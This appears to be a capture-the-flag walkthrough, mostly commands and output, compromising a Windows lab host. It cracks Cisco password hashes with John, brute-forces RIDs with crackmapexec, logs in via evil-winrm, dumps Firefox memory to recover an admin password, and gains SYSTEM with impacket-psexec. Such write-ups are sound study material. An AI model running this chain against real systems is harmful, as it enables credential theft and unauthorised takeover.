@@ -1,0 +1,213 @@
+
+
+
+go to website
+press login as guest
+
+there is a ticket with the following info as an attachment
+version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0Â mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
+
+https://www.ifm.net.nz/cookbooks/passwordcracker.html
+
+cisco type 7 password hash
+
+rout3r
+0242114B0E143F015F5D1E161713
+$uperP@ssword
+
+
+02375012182C1A1D751618034F36415408
+Q4)sJu\Y8qz*A3?d
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash                              
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+stealth1agent    (?)     
+1g 0:00:00:28 DONE (2025-08-27 03:35) 0.03460g/s 121288p/s 121288c/s 121288C/s steamboatwillie..steall3
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+We also see the username Hazard on this Page
+
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing SSH protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing FTP protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing RDP protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
+SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
+SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+we continue to brute force these new usernames with
+those passwords found earlier
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Chase\Documents> 
+*Evil-WinRM* PS C:\Users\Chase\Documents> get-process -name *
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    450      17     2248       5340               372   0 csrss
+    290      13     2252       5140               484   1 csrss
+    357      15     3464      14568              4376   1 ctfmon
+    254      14     3996      13324              3796   0 dllhost
+    166       9     1864       9696       0.03   6724   1 dllhost
+    617      32    29228      57884               984   1 dwm
+   1491      57    24204      79212              5136   1 explorer
+   1063      74   177088     253460       6.00   6384   1 firefox
+    347      19    10288      38732       0.11   6500   1 firefox
+    401      35    44292     104328       1.05   6644   1 firefox
+    378      28    25640      63192       0.41   6876   1 firefox
+    355      25    16424      38856       0.13   7152   1 firefox
+     49       6     1796       4636               788   1 fontdrvhost
+     49       6     1500       3888               792   0 fontdrvhost
+      0       0       56          8                 0   0 Idle
+    965      23     5856      14420               640   0 lsass
+    223      13     3000      10212              3656   0 msdtc
+      0      12      280      15844                88   0 Registry
+    145       8     1608       7536              5708   1 RuntimeBroker
+    301      16     5568      16800              5776   1 RuntimeBroker
+    274      14     3008      14960              6012   1 RuntimeBroker
+    673      32    19636      61784              5624   1 SearchUI
+    527      11     4928       9560               620   0 services
+    708      29    15028      51984              5520   1 ShellExperienceHost
+    440      17     4912      24108              4888   1 sihost
+     53       3      540       1180               268   0 smss
+    471      23     5792      16172              2532   0 spoolsv
+    199      12     1992       9604               488   0 svchost
+...
+    122       7     1228       5608              6332   0 svchost
+   1872       0      192        120                 4   0 System
+    211      20     4060      12408              4980   1 taskhostw
+    167      11     2904      10836              2848   0 VGAuthService
+    142       8     1688       6860              2856   0 vm3dservice
+    136       9     1812       7392              2976   1 vm3dservice
+    384      22    10476      22776              2876   0 vmtoolsd
+    236      18     5092      15212              4108   1 vmtoolsd
+    171      11     1488       6792               476   0 wininit
+    282      13     2816      12760               540   1 winlogon
+    345      16    10092      19696              3348   0 WmiPrvSE
+    610      27    50512      65672       0.66   1632   0 wsmprovhost
+
+
+*Evil-WinRM* PS C:\Users\Chase\Documents> 
+
+We're interested in the firefox processes.
+
+.\procdump64.exe -ma 6384 firefox.dmp
+
+*Evil-WinRM* PS C:\Users\Chase\Downloads> Get-Content .\firefox6384.dmp | Select-String -Pattern 'login_password'
+
+
+
+                                        -ÿÿÿÿÿÿÿÿïÿÿÿ
+¶¹=Ï®¿¿ÁG¿¿•¿¿¿C¿¿¿ó¿¿¿1¿¿¿µ¿¿¿þ¿¿¿‹¿¿¿:¿¿¿¿¿¿^privateBrowsingId=1http://localhostbhttp://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=¿¿	localhost¿¿¿€$í‘cZÿÿÿÿÿÿÿÿîÿÿÿ(
+
+admin
+4dD!5}x/re8]FBuZ
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-psexec 'administrator:4dD!5}x/re8]FBuZ@10.10.10.149'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.149.....
+[*] Found writable share ADMIN$
+[*] Uploading file LMIwBrjp.exe
+[*] Opening SVCManager on 10.10.10.149.....
+[*] Creating service KPGR on 10.10.10.149.....
+[*] Starting service KPGR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.437]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+
+
+
+
+
